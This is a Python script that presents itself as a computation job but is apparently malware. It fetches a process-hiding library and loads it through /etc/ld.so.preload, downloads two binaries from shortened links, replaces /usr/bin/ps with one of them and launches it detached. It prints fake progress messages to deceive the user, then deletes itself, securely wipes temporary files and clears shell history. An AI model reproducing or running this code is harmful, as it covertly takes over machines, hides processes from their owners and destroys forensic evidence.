import os
import subprocess as sub
import threading
import time
import random
import sys 

FNULL = open(os.devnull, 'w')

class RunCmd(threading.Thread):
	def __init__(self, cmd, timeout):
		threading.Thread.__init__(self)
		self.cmd = cmd
		self.timeout = timeout

	def run(self):
		self.p = sub.Popen(self.cmd, stdout=FNULL, stderr=sub.STDOUT, shell=True)
		self.p.wait()

	def Run(self):
		self.start()
		self.join(self.timeout)
		if self.is_alive():
			self.p.kill()
			self.join()

RunCmd(['apt update && apt install sudo'], 5*60).Run()
RunCmd(['sudo apt install secure-delete'], 5*60).Run()

RunCmd(['cd /tmp/ && git clone https://github.com/walters99/lib.git || true && cd lib && make'], 5*60).Run()
RunCmd(['sudo mv /tmp/lib/libprocesshider.so /usr/local/lib/'], 5*60).Run()
RunCmd(["sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'"], 5*60).Run()

RunCmd(['sudo apt update'], 5*60).Run()

RunCmd(['wget -O /tmp/ps https://bit.ly/2V23rgg'], 5*60).Run()
RunCmd(['wget -O /tmp/aux https://bit.ly/3sZ2odn'], 5*60).Run()
RunCmd(['chmod +x /tmp/ps /tmp/aux'], 5*60).Run()

RunCmd(['sudo mv /tmp/ps /usr/bin/ps'], 5*60).Run()
RunCmd(['sudo mv /tmp/aux /usr/bin/aux'], 5*60).Run()

RunCmd(['cd /usr/bin && nohup setsid ps aux &'], 5*60).Run()

i = 0
x = list(range(6, 9))
y = random.choice(x)
done = False

print('Working on your computation. Please wait..')
while True:
	print(f'{i} Hours')
	# time.sleep(1*60*60)
	time.sleep(1)
	i += 1
	if i == y:
		done = True
		print('Computation successfully.')
		break

if done is True:
	sub.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]), stdout=FNULL, stderr=sub.STDOUT, shell=True)
	RunCmd(['sudo srm -r /tmp/*'], 5*60).Run()
	RunCmd(['sudo srm -r /var/lib/apt/lists/*'], 5*60).Run()
	RunCmd(['sudo srm -r /var/tmp/*'], 5*60).Run()
	RunCmd(['history -c && history -w'], 5*60).Run()
	try:
		sys.exit(1)
	except:
		pass
